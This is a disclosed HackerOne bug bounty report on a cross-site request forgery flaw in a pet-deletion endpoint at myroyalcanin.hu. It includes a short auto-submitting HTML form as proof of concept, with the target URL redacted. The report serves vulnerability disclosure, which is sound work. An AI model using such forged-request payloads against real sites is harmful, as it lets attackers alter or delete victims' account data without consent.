# CSRF to delete a pet

## Report Details
- **Report ID**: 2029753
- **URL**: https://hackerone.com/reports/2029753
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-06-17T08:34:06.292Z
- **Disclosed**: 2023-08-30T15:47:40.031Z

## Reporter
- **Username**: dd_06
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mars

## Vulnerability Information
## Summary:
The ```/kisallataim/ANIMAL_ID/delete``` API endpoint at **myroyalcanin.hu** is vulnerable to Cross-Site Request Forgery attacks.
This vulnerability allows an attacker to delete a pet from the victim's account.

(Sorry for my English, I'm French)

## Proof-of-Concept (PoC)
```html
<html>
  <body>
    <form action="████">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```
You have to replace **ANIMAL_ID** with the ID of the victim's pet you wish to delete.

## Impact

An attacker can exploit this CSRF in order to delete the victim's pet.

## Attachments
No attachments
